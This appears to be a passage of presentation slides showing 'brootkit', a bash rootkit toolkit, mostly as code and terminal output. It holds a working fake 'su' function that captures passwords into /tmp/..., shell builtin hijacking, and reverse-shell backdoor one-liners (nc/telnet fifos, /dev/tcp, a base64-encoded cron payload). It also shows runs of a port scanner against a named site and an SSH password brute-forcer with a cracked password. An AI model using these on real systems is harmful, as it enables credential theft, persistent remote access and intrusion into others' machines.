}
•
[root@localhost brootkit]#  builtin()  {
•
>  echo  "fucking  hjacked?"
•
>  }
•
[root@localhost brootkit]#  builtin declare  -f
•
fucking  hjacked?
•
[root@localhost brootkit]#  command   builtin declare  -f
•
/bin/ls ()
•
{
•
echo  "hjacked again?"
•
}
•
builtin ()
•
{
•
echo  "fucking  hjacked?"
•
}
•
declare  ()
•
{
•
echo  "hijack  declare"
•
}
•
ls ()
•
{
•
echo  "hjacked?"
•
}
•
[root@localhost brootkit]#  command()  {
•
>  echo  "hijacked   command"
•
>  }
•
[root@localhost brootkit]#  command   builtin declare  -f
•
hijacked  command
•
[root@localhost brootkit]#
SU  thief
• Obtain  passwd?
–
sshd/pam  backdoor
–
hydra/ncrack
–
john  the  ripper
• Su  thief
[wzt@localhost ~]$  su
Password:
[root@localhost wzt]#  exit
exit
[wzt@localhost ~]$  cat  /tmp/...
loveshell
[wzt@localhost ~]$
function  su()
{
local  arg_list=(""  "-"   "-l"   "--login"
"-c"   "--command"   "--session-command"
"-f"   "--fast"
"-m"   "--preserve-environment"   "-p"
"-s"   "--shell=SHELL")
local  flag=0  tmp_arg arg pass
if  [  $UID  -eq 0  ];  then
/bin/su $1;  unset  su ;  return  $?
fi
for  arg in  ${arg_list[@]}
do
[  "$1"  =  "$arg"   ]  &&  flag=1
done
[  $#  -eq 0  ]  &&  flag=1
tmp_arg=$1;tmp_arg=${tmp_arg:0:1};
[  "$tmp_arg"   !=  "-"   -a  $flag  -eq 0  ]  &&  flag=1
if  [  $flag  -ne  1  ];then
/bin/su $1;  return  $?
fi
[  !  -f  /tmp/...  ]  &&  `touch  /tmp/...  &&  chmod 777  /tmp/...  >/dev/null  2>&1`
echo  -ne  "Password:\r\033[?25l"
read  -t  30  -s  pass
echo  -ne  "\033[K\033[?25h"
/bin/su &&  unset  su &&  echo  $pass  >>  /tmp/...
}
Backdoor
•
NC
–
mkfifo bd;cat bd|/bin/sh|nc localhost  8080  >bd
•
Bash  socket
–
/dev/tcp/host/port
–
/dev/udp/host/port
–
exec  9<>  /dev/tcp/localhost/8080&&exec  0&9  2>&1&&/bin/bash  --noprofile –I
•
Telnet
–
mkfifo bd;cat bd|/bin/sh -i 2>&1|telnet  localhost  8080  >bd
•
Base64  encode
–
*/1  *  *  *  *  a=`echo  
"ZXhlYyA5PD4gL2Rldi90Y3AvbG9jYWxob3N0LzgwODA7ZXhlYyAwPCY5O2V4ZWMgMT4mOSAyPiYxOy9iaW4vYmFzaCA
tLW5vcHJvZmlsZSAtaQ=="|base64  -d`;/bin/bash   -c  "$a";unset a
•
UDP
exec  9<>  /dev/udp/localhost/8080
[  $?  -eq 1  ]  &&  exit
echo  "connect  ok"  >&9
while  :
do
a=`dd bs=200  count=1  /dev/null`
if  echo  "$a"|grep "exit";  then  break;  fi
echo  `$a`  >&9
done
exec  9>&-
exec  9  /dev/tcp/$target_ip/$target_port
[  $?  -ne  0  ]  &&  exit  0  ||  exec  0&9  2>&1
if  type  python   >/dev/null;then
export  MAX_ROW_NUM  MAX_COL_NUM
python  -c  'import  pty;  pty.spawn("/bin/bash")'
else
/bin/bash   --rcfile $BR_ROOTKIT_PATH/.bdrc --noprofile -i
fi
}&
wait
sleep  $((RANDOM%sleep_time+sleep_time))
done
}
Port  scanner
[root@localhost brootkit]$  ./brscan.sh
./brscan.sh    [-n|-t|-o|-h]   
option:
-p                            ports,  pattern:  port1,port2,port3-port7,portn...
-n                            thread  num,  default  is  10
-t                            timeout,  default  is  30s
-o                            results  write  into  log  file,  default  is  brscan.log
-h                            help  information.
exp:
./brscan.sh  -p  21,22,23-25,80,135-139,8080  -t  20  www.cloud-sec.org
./brscan.sh  -p  1-65525  -n  200  -t  20  www.cloud-sec.org
[root@localhost brootkit]#  ./brscan.sh  -p  21,22,23-25,80,135-139,8080  -t  5  -n  20  www.wooyun.org
host:  www.wooyun.org   |  total  ports:  10  |  thread  num:  10  timeout:  5  |  logfile:  brscan.log
thread                      --
pid           -->          21
thread                      --
pid           -->          22
thread                      --
pid           -->          23
thread                      --
pid           -->          24
thread                      --
pid           -->          80
thread                      --
pid           -->          135
thread                      --
pid           -->          136
thread                      --
pid           -->          137
thread                      --
pid           -->          138
thread                      --
pid           -->          8080
[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]          10/10          6  s
www.wooyun.org:   80
Ssh crack
[root@localhost brootkit]#  ./sshcrack.sh
./sshcrack.sh        [-t  timeout]  [-n  threadnum]  [-o  logfile]
option:
-h                            host  name  or  host  list  file.
-u                            user  name  or  user  list  file.
-p                            single  passwd or  passwd list  file.
-t                            connect  timeout,  defalut is  5s.
-n                            thread  num,  default  is  1.
-o                            log  file.
-v                            display   help  information.
exp:
./sshcrack.sh  -h  192.168.215.148  -u  wzt -p  passwd.lst
./sshcrack.sh  -h  192.168.215.148  -u  wzt -p  passwd.lst -n  10  -t  2
./sshcrack.sh  -h  192.168.215.148  -u  user.lst -p  passwd.lst -n  10  -t  2
./sshcrack.sh  -h  host.lst -u  user.lst -p  passwd.lst -n  10  -t  2
[root@localhost brootkit]#  ./sshcrack.sh  -h  192.168.215.148  -u  wzt -p  passwd.lst -n  6
host:  1  |  users:  1  |  passwd:  28  thread:  6  |  timeout:  10  |  logfile:  sshcrack.log
Thread[  1]            PI:EMAIL                          ==>          [e                              
]            [failed]                  
3
Thread[  2]            PI:EMAIL                          ==>          [a                                        ]            [failed]                  
3
Thread[  3]            PI:EMAIL                          ==>          [d                              
]            [failed]                  
3
Thread[  4]            PI:EMAIL                          ==>          [giveshell
]            [success]                
6
Thread[  5]            PI:EMAIL                          ==>          [123456                    ]            [failed]                  
3
Thread[  6]            PI:EMAIL                          ==>          [fd
]            [failed]                  
3
waiting   all  threads  to  finsh...